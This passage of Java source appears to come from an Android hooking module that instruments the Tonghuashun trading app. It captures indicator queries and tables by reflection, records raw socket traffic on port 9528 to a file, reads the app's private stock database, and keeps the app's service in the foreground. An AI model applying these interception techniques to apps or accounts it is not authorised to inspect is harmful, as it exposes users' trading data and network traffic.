                target.put("rows", currentRows);
            }
            Map<String, org.json.JSONObject> bySecurity = new java.util.LinkedHashMap<>();
            for (int i = 0; i < currentRows.length(); i++) {
                org.json.JSONObject row = currentRows.optJSONObject(i);
                if (row != null) bySecurity.put(indicatorSecurityKey(row), row);
            }
            org.json.JSONArray incomingRows = incoming.optJSONArray("rows");
            if (incomingRows != null) {
                for (int i = 0; i < incomingRows.length(); i++) {
                    org.json.JSONObject next = incomingRows.optJSONObject(i);
                    if (next == null) continue;
                    String key = indicatorSecurityKey(next);
                    org.json.JSONObject existing = bySecurity.get(key);
                    if (existing == null) {
                        currentRows.put(next);
                        bySecurity.put(key, next);
                        continue;
                    }
                    if (existing.isNull("name")
                            || existing.optString("name", "").isEmpty()) {
                        existing.put("name", next.opt("name"));
                    }
                    org.json.JSONObject existingIndicators = existing.optJSONObject("indicators");
                    if (existingIndicators == null) {
                        existingIndicators = new org.json.JSONObject();
                        existing.put("indicators", existingIndicators);
                    }
                    org.json.JSONObject nextIndicators = next.optJSONObject("indicators");
                    if (nextIndicators != null) {
                        java.util.Iterator<String> keys = nextIndicators.keys();
                        while (keys.hasNext()) {
                            String indicatorId = keys.next();
                            existingIndicators.put(indicatorId, nextIndicators.opt(indicatorId));
                        }
                    }
                }
            }
        } catch (Throwable e) {
            Log.w(TAG, "INDICATOR_DIRECT merge failed: " + e.getMessage());
        }
    }

    private static String indicatorSecurityKey(org.json.JSONObject row) {
        return row.optString("market", "") + ":" + row.optString("code", "");
    }

    private static boolean containsIndicatorValues(
            org.json.JSONObject data, java.util.List<String> indicatorIds) {
        if (indicatorIds == null || indicatorIds.isEmpty()) return true;
        org.json.JSONArray rows = data.optJSONArray("rows");
        if (rows == null || rows.length() == 0) return false;
        for (String indicatorId : indicatorIds) {
            boolean found = false;
            for (int i = 0; i < rows.length(); i++) {
                org.json.JSONObject row = rows.optJSONObject(i);
                org.json.JSONObject indicators = row == null
                        ? null : row.optJSONObject("indicators");
                if (indicators != null && indicators.has(indicatorId)) {
                    found = true;
                    break;
                }
            }
            if (!found) return false;
        }
        return true;
    }

    private static int expectedIndicatorRowCount(
            org.json.JSONObject data, int start, int count, int explicitSecurityCount) {
        if (explicitSecurityCount > 0) return explicitSecurityCount;
        int total = data == null ? 0 : data.optInt("total", 0);
        if (total > 0) return Math.min(count, Math.max(0, total - start));
        return count;
    }

    private static boolean containsIndicatorValuesForRows(
            org.json.JSONObject data,
            java.util.List<String> indicatorIds,
            int expectedRows) {
        if (indicatorIds == null || indicatorIds.isEmpty()) return true;
        org.json.JSONArray rows = data == null ? null : data.optJSONArray("rows");
        if (rows == null || rows.length() < expectedRows) return false;
        for (int i = 0; i < expectedRows; i++) {
            org.json.JSONObject row = rows.optJSONObject(i);
            org.json.JSONObject indicators = row == null
                    ? null : row.optJSONObject("indicators");
            if (indicators == null) return false;
            for (String indicatorId : indicatorIds) {
                org.json.JSONObject cell = indicators.optJSONObject(indicatorId);
                if (cell == null || cell.isNull("content")) return false;
                Object content = cell.opt("content");
                if (content == null || org.json.JSONObject.NULL.equals(content)
                        || String.valueOf(content).trim().isEmpty()) {
                    return false;
                }
            }
        }
        return true;
    }

    private static int indicatorRowCount(org.json.JSONObject data) {
        org.json.JSONArray rows = data == null ? null : data.optJSONArray("rows");
        return rows == null ? 0 : rows.length();
    }

    private static void logIndicatorResultShape(Object table) {
        if (table == null || !indicatorResultShapeLogged.compareAndSet(false, true)) return;
        try {
            logClassShape(table.getClass());
            Method getValue = table.getClass().getMethod("getValue");
            Object values = getValue.invoke(table);
            if (values instanceof List && !((List<?>) values).isEmpty()) {
                Object first = ((List<?>) values).get(0);
                logClassShape(first.getClass());
                logObjectFieldTypes(first);
            }
        } catch (Throwable e) {
            Log.w(TAG, "INDICATOR_CAPTURE result shape failed: " + e.getMessage());
        }
    }

    private static org.json.JSONObject indicatorTableToJson(Object table) {
        org.json.JSONObject result = new org.json.JSONObject();
        org.json.JSONArray rows = new org.json.JSONArray();
        try {
            Object total = invokeNoArg(table, "getSecuritiesTotalSize");
            result.put("total", total == null ? org.json.JSONObject.NULL : total);
            Object values = invokeNoArg(table, "getValue");
            if (values instanceof List) {
                for (Object securityValue : (List<?>) values) {
                    org.json.JSONObject row = new org.json.JSONObject();
                    Object security = invokeNoArg(securityValue, "getSecurity");
                    row.put("code", nullableJsonValue(invokeNoArg(security, "getCode")));
                    row.put("market", nullableJsonValue(invokeNoArg(security, "getMarket")));
                    row.put("name", nullableJsonValue(invokeNoArg(security, "getName")));
                    org.json.JSONObject indicatorValues = new org.json.JSONObject();
                    Object rawValues = invokeNoArg(securityValue, "getValue");
                    if (rawValues instanceof Map) {
                        for (Map.Entry<?, ?> entry : ((Map<?, ?>) rawValues).entrySet()) {
                            Object indicator = entry.getKey();
                            Object cell = entry.getValue();
                            Object queryId = invokeNoArg(indicator, "getQueryId");
                            String key = queryId == null
                                    ? String.valueOf(indicator) : String.valueOf(queryId);
                            org.json.JSONObject cellJson = new org.json.JSONObject();
                            Object content = invokeNoArg(cell, "getContent");
                            if (content == null) content = readFieldValue(cell, "content");
                            Object color = invokeNoArg(cell, "getColor");
                            if (color == null) color = readFieldValue(cell, "color");
                            cellJson.put("content", nullableJsonValue(content));
                            cellJson.put("color", nullableJsonValue(color));
                            indicatorValues.put(key, cellJson);
                        }
                    }
                    row.put("indicators", indicatorValues);
                    rows.put(row);
                }
            }
        } catch (Throwable e) {
            try {
                result.put("serialization_error", String.valueOf(e));
            } catch (Throwable ignored) {
            }
        }
        try {
            result.put("rows", rows);
        } catch (Throwable ignored) {
        }
        return result;
    }

    private static Object nullableJsonValue(Object value) {
        return value == null ? org.json.JSONObject.NULL : value;
    }

    private static Object invokeNoArg(Object target, String methodName) {
        if (target == null) return null;
        try {
            Method method = target.getClass().getMethod(methodName);
            method.setAccessible(true);
            return method.invoke(target);
        } catch (Throwable ignored) {
            return null;
        }
    }

    private static Object readFieldValue(Object target, String fieldName) {
        if (target == null) return null;
        for (Class<?> type = target.getClass(); type != null; type = type.getSuperclass()) {
            try {
                Field field = type.getDeclaredField(fieldName);
                field.setAccessible(true);
                return field.get(target);
            } catch (Throwable ignored) {
            }
        }
        return null;
    }

    private static void hookIndicatorClientClass(Class<?> clientClass) {
        for (Method method : clientClass.getMethods()) {
            if (!"query".equals(method.getName()) || method.getParameterTypes().length != 2) continue;
            String key = method.toGenericString();
            if (hookedIndicatorClientMethods.putIfAbsent(key, true) != null) continue;
            try {
                Pine.hook(method, new MethodHook() {
                    @Override public void beforeCall(Pine.CallFrame callFrame) {
                        Object queryParam = callFrame.args != null && callFrame.args.length > 0
                                ? callFrame.args[0] : null;
                        Object callback = callFrame.args != null && callFrame.args.length > 1
                                ? callFrame.args[1] : null;
                        String queryId = "iq-" + indicatorQuerySequence.incrementAndGet();
                        if (callback != null) {
                            indicatorCallbackQueryIds.put(System.identityHashCode(callback), queryId);
                            hookIndicatorCallbackClass(callback.getClass());
                        }
                        appendIndicatorCapture("query", queryId,
                                "client=" + clientClass.getName()
                                        + " param=" + describeObjectFields(queryParam, 50000));
                    }
                });
                Log.i(TAG, "INDICATOR_CAPTURE query hook=" + key);
            } catch (Throwable e) {
                hookedIndicatorClientMethods.remove(key);
                Log.w(TAG, "INDICATOR_CAPTURE query hook failed: " + e.getMessage());
            }
        }
    }

    private static void hookIndicatorModelConstructors(
            ClassLoader cl,
            String className) {
        try {
            Class<?> modelClass = cl.loadClass(className);
            for (Constructor<?> constructor : modelClass.getDeclaredConstructors()) {
                String key = constructor.toGenericString();
                if (hookedIndicatorModelConstructors.putIfAbsent(key, true) != null) continue;
                constructor.setAccessible(true);
                try {
                    Pine.hook(constructor, new MethodHook() {
                        @Override public void afterCall(Pine.CallFrame callFrame) {
                            if (System.currentTimeMillis() > indicatorModelCaptureUntilMs) return;
                            appendIndicatorCapture(
                                    "construct",
                                    null,
                                    "class=" + modelClass.getName()
                                            + " args=" + java.util.Arrays.toString(callFrame.args)
                                            + " object=" + describeObjectFields(
                                                    callFrame.thisObject, 50000));
                        }
                    });
                } catch (Throwable e) {
                    hookedIndicatorModelConstructors.remove(key);
                    Log.w(TAG, "INDICATOR_CAPTURE constructor hook failed "
                            + key + ": " + e.getMessage());
                }
            }
        } catch (Throwable e) {
            Log.w(TAG, "INDICATOR_CAPTURE constructor class unavailable "
                    + className + ": " + e.getMessage());
        }
    }

    private static void hookIndicatorCallbackClass(Class<?> callbackClass) {
        for (Method method : callbackClass.getMethods()) {
            String name = method.getName();
            if (!("onNext".equals(name) || "onError".equals(name))) continue;
            String key = method.toGenericString();
            if (hookedIndicatorCallbackMethods.putIfAbsent(key, true) != null) continue;
            try {
                Pine.hook(method, new MethodHook() {
                    @Override public void beforeCall(Pine.CallFrame callFrame) {
                        String queryId = indicatorCallbackQueryIds.get(
                                System.identityHashCode(callFrame.thisObject));
                        StringBuilder detail = new StringBuilder("callback=")
                                .append(callbackClass.getName()).append(" args=[");
                        if (callFrame.args != null) {
                            for (int i = 0; i < callFrame.args.length; i++) {
                                if (i > 0) detail.append(", ");
                                detail.append(describeObjectFields(callFrame.args[i], 50000));
                            }
                        }
                        detail.append(']');
                        appendIndicatorCapture(name, queryId, detail.toString());
                    }
                });
            } catch (Throwable e) {
                hookedIndicatorCallbackMethods.remove(key);
                Log.w(TAG, "INDICATOR_CAPTURE callback hook failed: " + e.getMessage());
            }
        }
    }

    private static void appendIndicatorCapture(String phase, String queryId, String detail) {
        String record = "{\"at_ms\":" + System.currentTimeMillis()
                + ",\"phase\":\"" + esc(phase) + "\""
                + ",\"query_id\":" + (queryId == null ? "null" : "\"" + esc(queryId) + "\"")
                + ",\"detail\":\"" + esc(detail) + "\"}";
        synchronized (indicatorQueryCapture) {
            indicatorQueryCapture.add(record);
            while (indicatorQueryCapture.size() > 500) indicatorQueryCapture.remove(0);
        }
        Log.i(TAG, "INDICATOR_CAPTURE " + phase + " query_id=" + queryId
                + " bytes=" + record.length());
    }

    private static void resetIndicatorQueryCapture() {
        synchronized (indicatorQueryCapture) {
            indicatorQueryCapture.clear();
        }
        indicatorCallbackQueryIds.clear();
        indicatorModelCaptureUntilMs = System.currentTimeMillis() + 30_000L;
    }

    private static String readIndicatorQueryCapture() {
        StringBuilder result = new StringBuilder("{\"success\":true,\"records\":[");
        synchronized (indicatorQueryCapture) {
            for (int i = 0; i < indicatorQueryCapture.size(); i++) {
                if (i > 0) result.append(',');
                result.append(indicatorQueryCapture.get(i));
            }
        }
        return result.append("]}").toString();
    }

    private static File stuffTableCaptureFile() {
        try {
            Object app = currentApplication();
            if (!(app instanceof Context)) return null;
            return new File(((Context) app).getFilesDir(), "ths_table_reads.jsonl");
        } catch (Throwable e) {
            return null;
        }
    }

    private static void resetStuffTableCapture() {
        synchronized (marketWireFileLock) {
            stuffTableCaptureSignatures.clear();
            File file = stuffTableCaptureFile();
            if (file != null && file.exists() && !file.delete()) {
                Log.w(TAG, "TABLE_CAPTURE failed to clear previous capture");
            }
        }
    }

    private static void appendStuffTableCapture(Object table, Object data) {
        try {
            String caption = "";
            String headers = "null";
            try {
                Method getCaption = table.getClass().getMethod("getCaption");
                caption = String.valueOf(getCaption.invoke(table));
            } catch (Throwable ignored) {
            }
            try {
                Method getTableHead = table.getClass().getMethod("getTableHead");
                headers = toJson(getTableHead.invoke(table));
            } catch (Throwable ignored) {
            }
            int identity = System.identityHashCode(table);
            String payload = "{\"identity\":" + identity
                    + ",\"caption\":\"" + esc(caption) + "\""
                    + ",\"headers\":" + headers
                    + ",\"data\":" + toJson(data) + "}";
            int signature = payload.hashCode();
            Integer previous = stuffTableCaptureSignatures.put(identity, signature);
            if (previous != null && previous == signature) return;
            String line = "{\"at_ms\":" + System.currentTimeMillis()
                    + ",\"payload\":" + payload + "}\n";
            synchronized (marketWireFileLock) {
                File file = stuffTableCaptureFile();
                if (file == null) return;
                try (FileOutputStream output = new FileOutputStream(file, true)) {
                    output.write(line.getBytes("UTF-8"));
                }
            }
            Log.i(TAG, "TABLE_CAPTURE table=" + identity
                    + " caption=" + caption + " bytes=" + line.length());
        } catch (Throwable e) {
            Log.w(TAG, "TABLE_CAPTURE record failed: " + e.getMessage());
        }
    }

    private static String readStuffTableCapture() {
        synchronized (marketWireFileLock) {
            File file = stuffTableCaptureFile();
            if (file == null || !file.exists()) {
                return "{\"success\":true,\"records\":[]}";
            }
            StringBuilder records = new StringBuilder();
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(
                    new FileInputStream(file), "UTF-8"))) {
                String line;
                boolean first = true;
                while ((line = reader.readLine()) != null) {
                    if (line.trim().isEmpty()) continue;
                    if (!first) records.append(',');
                    first = false;
                    records.append(line);
                }
                return "{\"success\":true,\"records\":[" + records + "]}";
            } catch (Throwable e) {
                return "{\"success\":false,\"error\":\"" + esc(e.getMessage()) + "\"}";
            }
        }
    }

    private static void hookDirectProtocolRouter(Class<?> routerClass, Class<?> responseClass) {
        for (String methodName : new String[]{"a", "e", "f"}) {
            try {
                Method route = routerClass.getDeclaredMethod(methodName, responseClass);
                Pine.hook(route, new MethodHook() {
                    @Override public void beforeCall(Pine.CallFrame callFrame) {
                        if (callFrame.args == null || callFrame.args.length == 0) return;
                        captureDirectProtocolResponse(methodName, callFrame.args[0]);
                    }
                });
            } catch (Throwable e) {
                Log.w(TAG, "RT_PROTOCOL router hook failed method=" + methodName
                        + " error=" + e.getMessage());
            }
        }
    }

    private static void captureDirectProtocolResponse(String route, Object response) {
        if (response == null || directProtocolLatches.isEmpty()) return;
        try {
            for (Class<?> type = response.getClass();
                 type != null && type != Object.class;
                 type = type.getSuperclass()) {
                for (Field field : type.getDeclaredFields()) {
                    if (field.getType() != int.class && field.getType() != Integer.class) continue;
                    field.setAccessible(true);
                    Object raw = field.get(response);
                    if (!(raw instanceof Number)) continue;
                    int value = ((Number) raw).intValue();
                    CountDownLatch latch = directProtocolLatches.get(value);
                    if (latch == null) continue;
                    directProtocolResponses.put(value, response);
                    Log.i(TAG, "RT_PROTOCOL routed response route=" + route
                            + " instance=" + value + " field=" + field.getName());
                    latch.countDown();
                    return;
                }
            }
        } catch (Throwable e) {
            Log.w(TAG, "RT_PROTOCOL routed response capture failed: " + e.getMessage());
        }
    }

    private static void hookMarketSocketIo() {
        if (!marketSocketIoHooked.compareAndSet(false, true)) {
            return;
        }
        try {
            Class<?> outputClass = Class.forName("java.net.SocketOutputStream");
            Method write = outputClass.getDeclaredMethod(
                    "write", byte[].class, int.class, int.class);
            Pine.hook(write, new MethodHook() {
                @Override public void beforeCall(Pine.CallFrame callFrame) {
                    if (marketWireCaptureActive.get() <= 0) return;
                    Socket socket = findOwningSocket(callFrame.thisObject);
                    if (!isTargetMarketSocket(socket)) return;
                    byte[] bytes = (byte[]) callFrame.args[0];
                    int offset = ((Number) callFrame.args[1]).intValue();
                    int length = ((Number) callFrame.args[2]).intValue();
                    appendMarketWireRecord("out", socket, bytes, offset, length);
                }
            });

            Class<?> inputClass = Class.forName("java.net.SocketInputStream");
            Method read = inputClass.getDeclaredMethod(
                    "read", byte[].class, int.class, int.class);
            Pine.hook(read, new MethodHook() {
                @Override public void afterCall(Pine.CallFrame callFrame) {
                    if (marketWireCaptureActive.get() <= 0) return;
                    Object result = callFrame.getResult();
                    if (!(result instanceof Number)) return;
                    int length = ((Number) result).intValue();
                    if (length <= 0) return;
                    Socket socket = findOwningSocket(callFrame.thisObject);
                    if (!isTargetMarketSocket(socket)) return;
                    byte[] bytes = (byte[]) callFrame.args[0];
                    int offset = ((Number) callFrame.args[1]).intValue();
                    appendMarketWireRecord("in", socket, bytes, offset, length);
                }
            });
            Log.i(TAG, "RT_WIRE SocketInputStream/SocketOutputStream hooks installed");
        } catch (Throwable e) {
            marketSocketIoHooked.set(false);
            Log.e(TAG, "RT_WIRE socket hook install failed", e);
        }
    }

    private static Socket findOwningSocket(Object stream) {
        if (stream == null) return null;
        Class<?> current = stream.getClass();
        while (current != null) {
            for (Field field : current.getDeclaredFields()) {
                if (!Socket.class.isAssignableFrom(field.getType())) continue;
                try {
                    field.setAccessible(true);
                    Object value = field.get(stream);
                    if (value instanceof Socket) return (Socket) value;
                } catch (Throwable ignored) { }
            }
            current = current.getSuperclass();
        }
        return null;
    }

    private static boolean isTargetMarketSocket(Socket socket) {
        if (socket == null || socket.getRemoteSocketAddress() == null) return false;
        return socket.getPort() == 9528;
    }

    private static void beginMarketWireCapture(String key) {
        marketWireCaptureId = System.currentTimeMillis() + "-" + key;
        marketWireCaptureActive.incrementAndGet();
        synchronized (marketWireFileLock) {
            File file = marketWireCaptureFile();
            if (file != null && file.exists() && !file.delete()) {
                Log.w(TAG, "RT_WIRE failed to clear previous capture");
            }
        }
        Log.i(TAG, "RT_WIRE capture started id=" + marketWireCaptureId);
    }

    private static void endMarketWireCapture() {
        marketWireCaptureActive.set(0);
        Log.i(TAG, "RT_WIRE capture finished id=" + marketWireCaptureId);
    }

    private static File marketWireCaptureFile() {
        try {
            Object app = currentApplication();
            if (!(app instanceof Context)) return null;
            return new File(((Context) app).getFilesDir(), "ths_market_wire.jsonl");
        } catch (Throwable e) {
            return null;
        }
    }

    private static void appendMarketWireRecord(
            String direction,
            Socket socket,
            byte[] bytes,
            int offset,
            int length) {
        if (bytes == null || offset < 0 || length <= 0 || offset + length > bytes.length) return;
        try {
            byte[] copy = new byte[length];
            System.arraycopy(bytes, offset, copy, 0, length);
            String encoded = android.util.Base64.encodeToString(copy, android.util.Base64.NO_WRAP);
            String endpoint = String.valueOf(socket.getRemoteSocketAddress());
            String line = "{\"capture_id\":\"" + esc(marketWireCaptureId)
                    + "\",\"at_ms\":" + System.currentTimeMillis()
                    + ",\"direction\":\"" + direction
                    + "\",\"endpoint\":\"" + esc(endpoint)
                    + "\",\"length\":" + length
                    + ",\"bytes_base64\":\"" + encoded + "\"}\n";
            synchronized (marketWireFileLock) {
                File file = marketWireCaptureFile();
                if (file == null) return;
                try (FileOutputStream output = new FileOutputStream(file, true)) {
                    output.write(line.getBytes("UTF-8"));
                }
            }
            Log.i(TAG, "RT_WIRE " + direction + " endpoint=" + endpoint + " length=" + length);
        } catch (Throwable e) {
            Log.w(TAG, "RT_WIRE record failed: " + e.getMessage());
        }
    }

    private static String readMarketWireCapture() {
        synchronized (marketWireFileLock) {
            File file = marketWireCaptureFile();
            if (file == null || !file.exists()) {
                return "{\"success\":true,\"capture_id\":" + jsonValue(marketWireCaptureId)
                        + ",\"records\":[]}";
            }
            StringBuilder records = new StringBuilder();
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(
                    new FileInputStream(file), "UTF-8"))) {
                String line;
                boolean first = true;
                while ((line = reader.readLine()) != null) {
                    if (line.trim().isEmpty()) continue;
                    if (!first) records.append(',');
                    first = false;
                    records.append(line);
                }
                return "{\"success\":true,\"capture_id\":" + jsonValue(marketWireCaptureId)
                        + ",\"records\":[" + records + "]}";
            } catch (Throwable e) {
                return "{\"success\":false,\"error\":\"" + esc(e.getMessage()) + "\"}";
            }
        }
    }

    private static String redactProtocolText(String value) {
        if (value == null) return null;
        return value.replaceAll("(?m)^userid=[^\\r\\n]*", "userid=<redacted>");
    }

    private static void logClassShape(Class<?> clazz) {
        StringBuilder methods = new StringBuilder();
        for (Method method : clazz.getDeclaredMethods()) {
            if (methods.length() > 0) methods.append(';');
            methods.append(method.getName()).append('(');
            Class<?>[] params = method.getParameterTypes();
            for (int i = 0; i < params.length; i++) {
                if (i > 0) methods.append(',');
                methods.append(params[i].getName());
            }
            methods.append("):").append(method.getReturnType().getName());
        }
        StringBuilder constructors = new StringBuilder();
        for (java.lang.reflect.Constructor<?> constructor : clazz.getDeclaredConstructors()) {
            if (constructors.length() > 0) constructors.append(';');
            constructors.append('(');
            Class<?>[] params = constructor.getParameterTypes();
            for (int i = 0; i < params.length; i++) {
                if (i > 0) constructors.append(',');
                constructors.append(params[i].getName());
            }
            constructors.append(')');
        }
        StringBuilder fields = new StringBuilder();
        for (Field field : clazz.getDeclaredFields()) {
            if (fields.length() > 0) fields.append(';');
            fields.append(field.getName()).append(':').append(field.getType().getName());
        }
        Log.i(TAG, "RT_PROTOCOL class=" + clazz.getName()
                + " constructors=" + constructors
                + " fields=" + fields
                + " methods=" + methods);
    }

    private static void logObjectFieldTypes(Object target) {
        if (target == null) return;
        for (Class<?> type = target.getClass();
             type != null && type != Object.class;
             type = type.getSuperclass()) {
            for (Field field : type.getDeclaredFields()) {
                try {
                    field.setAccessible(true);
                    Object value = field.get(target);
                    if (value != null) {
                        Log.i(TAG, "RT_PROTOCOL field=" + type.getName() + "."
                                + field.getName() + " valueClass="
                                + value.getClass().getName());
                        logClassShape(value.getClass());
                    }
                } catch (Throwable ignored) {
                    // Diagnostic-only reflection must not affect the request.
                }
            }
        }
    }

    private static void hookCommunicationServiceKeepAlive(ClassLoader cl) {
        if (!communicationKeepAliveHooked.compareAndSet(false, true)) {
            return;
        }
        try {
            Class<?> serviceClass = cl.loadClass("com.hexin.plat.android.CommunicationService");
            Method onCreate = serviceClass.getDeclaredMethod("onCreate");
            Pine.hook(onCreate, new MethodHook() {
                @Override public void afterCall(Pine.CallFrame callFrame) {
                    try {
                        Service service = (Service) callFrame.thisObject;
                        String channelId = "ths_hook_market_core";
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            NotificationManager manager = (NotificationManager) service.getSystemService(
                                    Context.NOTIFICATION_SERVICE);
                            NotificationChannel channel = new NotificationChannel(
                                    channelId,
                                    "Market data core",
                                    NotificationManager.IMPORTANCE_MIN);
                            channel.setShowBadge(false);
                            manager.createNotificationChannel(channel);
                        }
                        Notification.Builder builder = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                                ? new Notification.Builder(service, channelId)
                                : new Notification.Builder(service);
                        Notification notification = builder
                                .setContentTitle("Market data core")
                                .setContentText("Real-time market data connection is active")
                                .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
                                .setOngoing(true)
                                .build();
                        int notificationId = proxyPortForCurrentUser();
                        service.startForeground(notificationId, notification);
                        Log.i(TAG, "CommunicationService promoted to foreground androidUser="
                                + androidUserId());
                    } catch (Throwable e) {
                        Log.e(TAG, "CommunicationService foreground promotion failed", e);
                    }
                }
            });
            Log.i(TAG, "CommunicationService keep-alive hook installed");
        } catch (Throwable e) {
            communicationKeepAliveHooked.set(false);
            Log.e(TAG, "CommunicationService keep-alive hook install failed", e);
        }
    }

    private static void startLegacyCommunicationService(Object application, ClassLoader cl) throws Exception {
        Class<?> contextClass = Class.forName("android.content.Context");
        Class<?> intentClass = Class.forName("android.content.Intent");
        Class<?> serviceClass = cl.loadClass("com.hexin.plat.android.CommunicationService");
        Object intent = intentClass.getConstructor(contextClass, Class.class)
                .newInstance(application, serviceClass);
        intentClass.getMethod("putExtra", String.class, String.class).invoke(
                intent,
                "hexin_connect_hangqing_flag_key",
                "hexin_connect_hangqing_flag");
        application.getClass().getMethod("startService", intentClass).invoke(application, intent);
        serviceClass.getMethod("activityStateChangeNotify", boolean.class).invoke(null, true);
    }

    private static String jsonValue(String value) {
        if (value == null) return "null";
        String trimmed = value.trim();
        if ((trimmed.startsWith("{") && trimmed.endsWith("}"))
                || (trimmed.startsWith("[") && trimmed.endsWith("]"))) {
            return trimmed;
        }
        return "\"" + esc(value).replace("\n", "\\n").replace("\r", "\\r") + "\"";
    }

    private static String extractDomain(String url) {
        try {
            int start = url.indexOf("://");
            if (start == -1) return null;
            start += 3;
            int end = url.indexOf("/", start);
            if (end == -1) end = url.length();
            int portIdx = url.indexOf(":", start);
            if (portIdx != -1 && portIdx < end) end = portIdx;
            return url.substring(start, end);
        } catch (Throwable e) {
            return null;
        }
    }

    private static String extractJsonString(String json, String key) {
        String pattern = "\"" + key + "\"";
        int idx = json.indexOf(pattern);
        if (idx == -1) return null;
        idx = json.indexOf(":", idx + pattern.length());
        if (idx == -1) return null;
        idx++;
        while (idx < json.length() && (json.charAt(idx) == ' ' || json.charAt(idx) == '\t')) idx++;
        if (idx >= json.length()) return null;
        if (json.charAt(idx) == '"') {
            idx++;
            StringBuilder sb = new StringBuilder();
            while (idx < json.length() && json.charAt(idx) != '"') {
                if (json.charAt(idx) == '\\' && idx + 1 < json.length()) {
                    idx++;
                    char c = json.charAt(idx);
                    if (c == 'n') sb.append('\n');
                    else if (c == 't') sb.append('\t');
                    else sb.append(c);
                } else {
                    sb.append(json.charAt(idx));
                }
                idx++;
            }
            return sb.toString();
        }
        return null;
    }

    /**
     * 从 JSON 中提取对象值（用于 extra_headers）
     */
    private static String extractJsonObject(String json, String key) {
        String pattern = "\"" + key + "\"";
        int idx = json.indexOf(pattern);
        if (idx == -1) return null;
        idx = json.indexOf(":", idx + pattern.length());
        if (idx == -1) return null;
        idx++;
        while (idx < json.length() && (json.charAt(idx) == ' ' || json.charAt(idx) == '\t')) idx++;
        if (idx >= json.length()) return null;
        if (json.charAt(idx) == '{') {
            int braceCount = 1;
            int start = idx;
            idx++;
            while (idx < json.length() && braceCount > 0) {
                char c = json.charAt(idx);
                if (c == '{') braceCount++;
                else if (c == '}') braceCount--;
                idx++;
            }
            return json.substring(start, idx);
        }
        return null;
    }

    // ========== 股票数据查询方法 ==========

    /**
     * 获取股票数据库实例
     */
    private static Object getStockDatabase() {
        // 首选数据库路径
        String XCS2_DB_PATH = "/data/data/com.hexin.plat.android/databases/xcs2.db";

        // 检查现有数据库是否正确
        if (stockDatabase != null) {
            try {
                Method isOpen = stockDatabase.getClass().getMethod("isOpen");
                if ((boolean) isOpen.invoke(stockDatabase)) {
                    // 检查是否是 xcs2.db
                    Method getPath = stockDatabase.getClass().getMethod("getPath");
                    String path = (String) getPath.invoke(stockDatabase);
                    if (path != null && path.contains("xcs2")) {
                        return stockDatabase;
                    }
                    // 不是 xcs2.db，关闭它并重新打开正确的数据库
                    Log.i(TAG, "Current database is not xcs2.db, reopening...");
                }
            } catch (Throwable ignored) {}
        }

        // 尝试打开 xcs2.db
        try {
            Class<?> sqliteClass = Class.forName("android.database.sqlite.SQLiteDatabase");
            Method openDatabase = sqliteClass.getMethod("openDatabase",
                String.class,
                Class.forName("android.database.sqlite.SQLiteDatabase$CursorFactory"),
                int.class
            );

            java.io.File dbFile = new java.io.File(XCS2_DB_PATH);
            if (dbFile.exists()) {
                // OPEN_READONLY = 1
                Object db = openDatabase.invoke(null, XCS2_DB_PATH, null, 1);
                if (db != null) {
                    Log.i(TAG, "Stock database opened: " + XCS2_DB_PATH);
                    stockDatabase = db;
                    return db;
                }
            } else {
                Log.w(TAG, "xcs2.db does not exist yet");
            }
        } catch (Throwable e) {
            Log.e(TAG, "getStockDatabase failed: " + e.getMessage());
        }

        return null;
    }

    /**
     * 执行 SQL 查询并返回 JSON 结果
     */
    private static String executeStockQuery(String sql, String[] args) {
        Object db = getStockDatabase();
        if (db == null) {
            return "{\"error\":\"Database not available\",\"hint\":\"请先在App中打开持仓页面\"}";
        }

        try {
            Method rawQuery = db.getClass().getMethod("rawQuery", String.class, String[].class);
            Object cursor = rawQuery.invoke(db, sql, args);

            if (cursor == null) {
                return "{\"error\":\"Query returned null cursor\"}";
            }

            // 获取列名
            Method getColumnNames = cursor.getClass().getMethod("getColumnNames");
            String[] columns = (String[]) getColumnNames.invoke(cursor);

            // 遍历结果
            Method moveToNext = cursor.getClass().getMethod("moveToNext");
            Method getString = cursor.getClass().getMethod("getString", int.class);
            Method getColumnIndex = cursor.getClass().getMethod("getColumnIndex", String.class);
            Method getType = cursor.getClass().getMethod("getType", int.class);
            Method getDouble = cursor.getClass().getMethod("getDouble", int.class);
            Method getLong = cursor.getClass().getMethod("getLong", int.class);

            StringBuilder sb = new StringBuilder();
            sb.append("{\"columns\":").append(toJsonArray(columns));
            sb.append(",\"data\":[");

            boolean first = true;
            int rowCount = 0;
            while ((boolean) moveToNext.invoke(cursor) && rowCount < 500) {
                if (!first) sb.append(",");
                first = false;
                sb.append("{");

                boolean firstCol = true;
                for (String col : columns) {
                    if (!firstCol) sb.append(",");
                    firstCol = false;

                    int idx = (int) getColumnIndex.invoke(cursor, col);
                    int type = (int) getType.invoke(cursor, idx);

                    sb.append("\"").append(escapeJson(col)).append("\":");

                    // type: 0=NULL, 1=INTEGER, 2=FLOAT, 3=STRING, 4=BLOB
                    if (type == 0) {
                        sb.append("null");
                    } else if (type == 1) {
                        sb.append(getLong.invoke(cursor, idx));
                    } else if (type == 2) {
                        sb.append(getDouble.invoke(cursor, idx));
                    } else {
                        String val = (String) getString.invoke(cursor, idx);
                        if (val == null) {
                            sb.append("null");
                        } else {
                            sb.append("\"").append(escapeJson(val)).append("\"");
                        }
                    }
                }
                sb.append("}");
                rowCount++;
            }

            sb.append("],\"row_count\":").append(rowCount).append("}");

            // 关闭 cursor
            Method close = cursor.getClass().getMethod("close");
            close.invoke(cursor);

            return sb.toString();
        } catch (Throwable e) {
            Log.e(TAG, "executeStockQuery failed: " + e.getMessage());
            return "{\"error\":\"" + escapeJson(e.getMessage()) + "\"}";
        }
    }

    /**
     * 查询持仓
     */
    private static String queryStockPositions() {
        return legacyStockDatabaseUnavailable("positions");
    }

    /**
     * 查询资产
     */
    private static String queryStockAssets() {
        return legacyStockDatabaseUnavailable("assets");
    }

    /**
     * 查询委托
     */
    private static String queryStockOrders() {
        return legacyStockDatabaseUnavailable("orders");
    }

    /**
     * 查询历史成交
     */
    private static String queryStockHistory() {
        return legacyStockDatabaseUnavailable("history");
    }

    /**
     * 查询当日成交
     */
    private static String queryStockDaily() {
        return legacyStockDatabaseUnavailable("daily_deals");
    }

    private static String legacyStockDatabaseUnavailable(String capability) {
        return "{\"status\":\"legacy_unavailable\",\"capability\":\""
                + escapeJson(capability)
